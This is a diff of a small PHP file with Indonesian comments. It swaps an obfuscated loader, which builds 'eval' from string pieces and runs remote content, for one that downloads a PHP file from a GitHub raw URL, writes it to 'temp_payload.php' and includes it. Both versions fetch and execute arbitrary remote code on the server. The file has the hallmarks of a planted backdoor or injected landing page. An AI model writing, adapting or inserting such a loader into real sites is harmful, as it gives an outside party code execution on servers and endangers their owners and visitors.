@@ -1,11 +1,15 @@
 <?php
+// Function getURL sama seperti sebelumnya
 
-$a = 'ev';
-$b = $a.'al'; 
+$content = getURL("https://raw.githubusercontent.com/Rendisudiro03/landing/refs/heads/main/landingku.txt");
+$temp_file = 'temp_payload.php';
 
-function lodekri($url) {
-}
+// Menulis konten ke file temporer
+file_put_contents($temp_file, $content);
 
-$b("?>" . lodekri("https://raw.githubusercontent.com/Rendisudiro03/landing/refs/heads/main/landingku.txt")); 
+// Memanggil file temporer tersebut
+include $temp_file;
 
+// Opsional: hapus file setelah dieksekusi
+// unlink($temp_file); 
 ?>
